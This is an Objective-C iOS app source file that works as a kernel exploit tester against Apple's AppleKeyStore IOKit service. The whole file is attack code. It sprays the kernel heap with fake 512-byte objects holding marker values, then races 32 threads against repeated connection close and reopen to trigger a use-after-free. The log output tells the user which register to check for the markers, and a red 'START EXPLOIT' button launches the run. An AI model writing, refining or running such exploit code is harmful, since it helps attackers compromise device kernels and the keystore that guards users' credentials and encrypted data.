#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   32
#define MAX_ATTEMPTS 2000

// ========== HEAP SPRAY CONFIGURATION ==========
#define SPRAY_COUNT         500      // Reduced for stability
#define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
#define SPRAY_DELAY_MS      100      // Delay after spray (milliseconds)
// ==============================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;

// ========== HEAP SPRAY GLOBALS ==========
static io_connect_t g_spray_conns[SPRAY_COUNT];
static int g_spray_count = 0;
// ========================================

// ========== HEAP SPRAY: Enhanced fake gate object with MULTIPLE MARKERS ==========
typedef struct {
    uint64_t vtable;                    // +0x00: 0x4141414141414141 (marker)
    uint64_t lock;                      // +0x08: 0x0000000000000000
    uint64_t refcount;                  // +0x10: 0x0000000100000001
    uint64_t pad1[31];                  // +0x18 to +0x10F: 0x2020... (filler)
    uint64_t marker_0x110;              // +0x110: 0x4242424242424242 (PRIMARY MARKER)
    uint64_t marker_0x118;              // +0x118: 0x4343434343434343 (backup)
    uint64_t marker_0x120;              // +0x120: 0x4444444444444444 (backup)
    uint64_t marker_0x128;              // +0x128: 0x4545454545454545 (backup)
    uint64_t pad2[26];                  // Rest: 0x2020... (filler)
} __attribute__((packed)) fake_gate_t;

// Compile-time verification
_Static_assert(sizeof(fake_gate_t) == 512, "fake_gate_t must be exactly 512 bytes");
_Static_assert(offsetof(struct { uint64_t vtable; uint64_t lock; uint64_t refcount; uint64_t pad1[31]; uint64_t marker_0x110; }, marker_0x110) == 0x110, "marker_0x110 must be at offset 0x110");
// =================================================================================

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        uint64_t input[1] = {0};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
    }
    return NULL;
}

// ========== HEAP SPRAY FUNCTIONS (WITH ENHANCED LOGGING) ==========

static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
    kern_return_t kr;
    int fail_count = 0;
    
    // === STEP 0: Log configuration ===
    log_callback(@"");
    log_callback(@"╔══════════════════════════════════════════════════╗");
    log_callback(@"║        HEAP SPRAY CONFIGURATION (v3_debug)       ║");
    log_callback(@"╚══════════════════════════════════════════════════╝");
    log_callback([NSString stringWithFormat:@"Spray count:     %d connections", SPRAY_COUNT]);
    log_callback([NSString stringWithFormat:@"Structure size:  %zu bytes", sizeof(fake_gate_t)]);
    log_callback([NSString stringWithFormat:@"Buffer size:     %d bytes", SPRAY_BUFFER_SIZE]);
    
    // Verify offsets at runtime
    log_callback(@"");
    log_callback(@"Structure layout verification:");
    log_callback([NSString stringWithFormat:@"  vtable:       offset 0x%03lx", offsetof(fake_gate_t, vtable)]);
    log_callback([NSString stringWithFormat:@"  lock:         offset 0x%03lx", offsetof(fake_gate_t, lock)]);
    log_callback([NSString stringWithFormat:@"  refcount:     offset 0x%03lx", offsetof(fake_gate_t, refcount)]);
    log_callback([NSString stringWithFormat:@"  marker_0x110: offset 0x%03lx ✓", offsetof(fake_gate_t, marker_0x110)]);
    log_callback([NSString stringWithFormat:@"  marker_0x118: offset 0x%03lx", offsetof(fake_gate_t, marker_0x118)]);
    log_callback([NSString stringWithFormat:@"  marker_0x120: offset 0x%03lx", offsetof(fake_gate_t, marker_0x120)]);
    log_callback([NSString stringWithFormat:@"  marker_0x128: offset 0x%03lx", offsetof(fake_gate_t, marker_0x128)]);
    
    // Create a test structure and verify its contents
    fake_gate_t test_gate;
    test_gate.vtable = 0x4141414141414141ULL;
    test_gate.lock = 0x0000000000000000ULL;
    test_gate.refcount = 0x0000000100000001ULL;
    for (int i = 0; i < 31; i++) {
        test_gate.pad1[i] = 0x2020202020202020ULL;
    }
    test_gate.marker_0x110 = 0x4242424242424242ULL;
    test_gate.marker_0x118 = 0x4343434343434343ULL;
    test_gate.marker_0x120 = 0x4444444444444444ULL;
    test_gate.marker_0x128 = 0x4545454545454545ULL;
    for (int i = 0; i < 26; i++) {
        test_gate.pad2[i] = 0x2020202020202020ULL;
    }
    
    // Verify marker values in memory
    uint8_t *bytes = (uint8_t *)&test_gate;
    log_callback(@"");
    log_callback(@"Memory verification at key offsets:");
    log_callback([NSString stringWithFormat:@"  0x000: %02x %02x %02x %02x %02x %02x %02x %02x (vtable)",
                  bytes[0x00], bytes[0x01], bytes[0x02], bytes[0x03],
                  bytes[0x04], bytes[0x05], bytes[0x06], bytes[0x07]]);
    log_callback([NSString stringWithFormat:@"  0x110: %02x %02x %02x %02x %02x %02x %02x %02x (marker_0x110) ✓",
                  bytes[0x110], bytes[0x111], bytes[0x112], bytes[0x113],
                  bytes[0x114], bytes[0x115], bytes[0x116], bytes[0x117]]);
    log_callback([NSString stringWithFormat:@"  0x118: %02x %02x %02x %02x %02x %02x %02x %02x (marker_0x118)",
                  bytes[0x118], bytes[0x119], bytes[0x11a], bytes[0x11b],
                  bytes[0x11c], bytes[0x11d], bytes[0x11e], bytes[0x11f]]);
    
    log_callback(@"");
    log_callback(@"╔══════════════════════════════════════════════════╗");
    log_callback(@"║           Starting Connection Spray              ║");
    log_callback(@"╚══════════════════════════════════════════════════╝");
    
    // Step 1: Open IOService connections
    for (int i = 0; i < SPRAY_COUNT; i++) {
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) { // kIOReturnNoResources
                log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections", i]);
                g_spray_count = i;
                break;
            } else {
                fail_count++;
                log_callback([NSString stringWithFormat:@"[SPRAY] Connection %d failed: 0x%x", i, kr]);
                
                if (fail_count > 10) {
                    log_callback(@"[SPRAY] Too many failures, aborting");
                    g_spray_count = i - fail_count;
                    return -1;
                }
            }
            g_spray_conns[i] = IO_OBJECT_NULL;
            continue;
        }
        
        if ((i + 1) % 100 == 0) {
            log_callback([NSString stringWithFormat:@"[SPRAY] Progress: %d/%d", i + 1, SPRAY_COUNT]);
        }
    }
    
    if (g_spray_count == 0) {
        g_spray_count = SPRAY_COUNT;
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY] ✓ Opened %d valid connections", g_spray_count]);
    
    // Step 2: Allocate fake objects via external method
    log_callback(@"");
    log_callback(@"╔══════════════════════════════════════════════════╗");
    log_callback(@"║              Spraying Fake Objects               ║");
    log_callback(@"╚══════════════════════════════════════════════════╝");
    
    int spray_success = 0;
    int spray_failed = 0;
    
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] == IO_OBJECT_NULL) {
            continue;
        }
        
        // Create fake gate object
        fake_gate_t fakeGate;
        fakeGate.vtable = 0x4141414141414141ULL;
        fakeGate.lock = 0x0000000000000000ULL;
        fakeGate.refcount = 0x0000000100000001ULL;
        
        for (int j = 0; j < 31; j++) {
            fakeGate.pad1[j] = 0x2020202020202020ULL;
        }
        
        fakeGate.marker_0x110 = 0x4242424242424242ULL;
        fakeGate.marker_0x118 = 0x4343434343434343ULL;
        fakeGate.marker_0x120 = 0x4444444444444444ULL;
        fakeGate.marker_0x128 = 0x4545454545454545ULL;
        
        for (int j = 0; j < 26; j++) {
            fakeGate.pad2[j] = 0x2020202020202020ULL;
        }
        
        // Verify the object before sending
        if (i == 0) {  // Only log first object to avoid spam
            uint8_t *obj_bytes = (uint8_t *)&fakeGate;
            log_callback(@"First fake object verification:");
            log_callback([NSString stringWithFormat:@"  Bytes at 0x110: %02x %02x %02x %02x %02x %02x %02x %02x",
                          obj_bytes[0x110], obj_bytes[0x111], obj_bytes[0x112], obj_bytes[0x113],
                          obj_bytes[0x114], obj_bytes[0x115], obj_bytes[0x116], obj_bytes[0x117]]);
        }
        
        // Send fake object to kernel
        uint64_t scalar_input = 0xDEADBEEF;
        kr = IOConnectCallMethod(
            g_spray_conns[i],
            1,
            &scalar_input, 1,
            &fakeGate, sizeof(fakeGate),
            NULL, NULL,
            NULL, NULL
        );
        
        if (kr == KERN_SUCCESS) {
            spray_success++;
        } else {
            spray_failed++;
            if (spray_failed <= 5) {  // Only log first few failures
                log_callback([NSString stringWithFormat:@"[SPRAY] Object %d spray failed: 0x%x", i, kr]);
            }
        }
        
        if ((i + 1) % 100 == 0) {
            log_callback([NSString stringWithFormat:@"[SPRAY] Objects sent: %d/%d (success: %d, failed: %d)",
                          i + 1, g_spray_count, spray_success, spray_failed]);
        }
    }
    
    log_callback(@"");
    log_callback(@"╔══════════════════════════════════════════════════╗");
    log_callback(@"║             Heap Spray Complete                  ║");
    log_callback(@"╚══════════════════════════════════════════════════╝");
    log_callback([NSString stringWithFormat:@"Total objects sprayed: %d", spray_success]);
    log_callback([NSString stringWithFormat:@"Spray failures:        %d", spray_failed]);
    log_callback([NSString stringWithFormat:@"Success rate:          %.1f%%", 
                  (spray_success * 100.0) / g_spray_count]);
    log_callback(@"");
    log_callback(@"Marker legend (for crash analysis):");
    log_callback(@"  0x4141414141414141 = vtable field");
    log_callback(@"  0x4242424242424242 = marker at offset 0x110 ← PRIMARY");
    log_callback(@"  0x4343434343434343 = marker at offset 0x118");
    log_callback(@"  0x4444444444444444 = marker at offset 0x120");
    log_callback(@"  0x4545454545454545 = marker at offset 0x128");
    log_callback(@"  0x2020202020202020 = padding filler");
    log_callback(@"");
    
    // Small delay to let spray settle
    usleep(SPRAY_DELAY_MS * 1000);
    
    if (spray_success < (g_spray_count / 2)) {
        log_callback(@"⚠️  WARNING: Less than 50% spray success rate!");
        return -1;
    }
    
    return 0;
}

static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
    log_callback([NSString stringWithFormat:@"[CLEANUP] Closing %d spray connections", g_spray_count]);
    
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] != IO_OBJECT_NULL) {
            IOServiceClose(g_spray_conns[i]);
            g_spray_conns[i] = IO_OBJECT_NULL;
        }
    }
    
    g_spray_count = 0;
    log_callback(@"[CLEANUP] Spray cleanup complete");
}

// ==================================================================

@interface ViewController ()
@property (strong, nonatomic) UITextView *textView;
@property (strong, nonatomic) UIButton *testButton;
@property (nonatomic, strong) NSMutableString *logBuffer;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    // 1. Cài đặt màu nền cho màn hình chính
    self.view.backgroundColor = [UIColor blackColor];
    
    // 2. Tạo TextView để hiện Log
    self.textView = [[UITextView alloc] initWithFrame:CGRectMake(10, 60, self.view.bounds.size.width - 20, self.view.bounds.size.height - 200)];
    self.textView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0]; // Màu xám đen
    self.textView.textColor = [UIColor greenColor]; // Chữ màu xanh lá cho giống hacker
    self.textView.font = [UIFont fontWithName:@"Menlo" size:12.0];
    self.textView.editable = NO;
    self.textView.layer.cornerRadius = 10;
    [self.view addSubview:self.textView];
    
    // 3. Tạo Button để chạy Test
    self.testButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.testButton.frame = CGRectMake(20, self.view.bounds.size.height - 100, self.view.bounds.size.width - 40, 50);
    [self.testButton setTitle:@"START EXPLOIT v3_debug" forState:UIControlStateNormal];
    [self.testButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.testButton.backgroundColor = [UIColor systemRedColor];
    self.testButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    self.testButton.layer.cornerRadius = 12;
    
    // Kết nối nút bấm với hàm runTest:
    [self.testButton addTarget:self action:@selector(runTest:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.testButton];
    
    // 4. Khởi tạo buffer log
    self.logBuffer = [NSMutableString string];
    [self appendLog:@"[SYSTEM] UAF Tester Ready (v3_debug)"];
    [self appendLog:@"[SYSTEM] UI initialized programmatically."];
}

- (IBAction)runTest:(id)sender {
    self.testButton.enabled = NO;
    [self.logBuffer setString:@""];
    [self appendLog:@"========================================"];
    [self appendLog:@"Starting UAF test (with heap spray)..."];
    [self appendLog:@"========================================"];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self runUAFWithSpray];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.testButton.enabled = YES;
        });
    });
}

- (void)runUAFWithSpray {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                    IOServiceMatching(AKS_SERVICE));
    if (!svc) {
        [self appendLog:@"Failed to find AppleKeyStore service"];
        return;
    }
    
    // ===== PHASE 1: HEAP SPRAY =====
    [self appendLog:@""];
    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
    
    int spray_result = heap_spray_init(svc, ^(NSString *msg) {
        [self appendLog:msg];
    });
    
    if (spray_result != 0) {
        [self appendLog:@"❌ Heap spray failed!"];
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@"✓ Heap spray successful"];
    [self appendLog:@""];
    
    // ===== PHASE 2: UAF TRIGGER =====
    [self appendLog:@">>> PHASE 2: UAF TRIGGER"];
    
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
        [self appendLog:@"Failed to open connection"];
        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@"Connection opened"];
    
    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_create(&threads[i], NULL, racer_thread, NULL);
    }
    
    atomic_store_explicit(&g_phase, 1, memory_order_release);
    [self appendLog:@"Racers started"];
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (atomic_load(&g_errors) > 0) {
            [self appendLog:[NSString stringWithFormat:@"UAF triggered at attempt %d", attempt]];
            break;
        }
        
        kr = IOServiceClose(g_conn);
        usleep(1);
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
        if (kr != KERN_SUCCESS) {
            [self appendLog:@"Reopen failed"];
            break;
        }
        
        if ((attempt + 1) % 100 == 0) {
            uint32_t calls = atomic_load(&g_calls);
            [self appendLog:[NSString stringWithFormat:@"Progress: %d attempts, %u calls", 
                            attempt + 1, calls]];
        }
    }
    
    atomic_store_explicit(&g_phase, 3, memory_order_release);
    
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    uint32_t total_calls = atomic_load(&g_calls);
    uint32_t total_errors = atomic_load(&g_errors);
    
    [self appendLog:@""];
    [self appendLog:@"========================================"];
    [self appendLog:@"Test Results:"];
    [self appendLog:[NSString stringWithFormat:@"Total calls:  %u", total_calls]];
    [self appendLog:[NSString stringWithFormat:@"Total errors: %u", total_errors]];
    
    if (total_errors > 0) {
        [self appendLog:@"✓ UAF TRIGGERED!"];
        [self appendLog:@""];
        [self appendLog:@"Check crash log for x16 register:"];
        [self appendLog:@"  Expected: One of our markers"];
        [self appendLog:@"  0x4242... = offset 0x110 ✓"];
        [self appendLog:@"  0x4343... = offset 0x118"];
        [self appendLog:@"  0x4444... = offset 0x120"];
        [self appendLog:@"  0x4545... = offset 0x128"];
    } else {
        [self appendLog:@"UAF not triggered"];
    }
    [self appendLog:@"========================================"];
    
    // Cleanup
    if (g_conn != IO_OBJECT_NULL) {
        IOServiceClose(g_conn);
    }
    
    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
    IOObjectRelease(svc);
}

@end
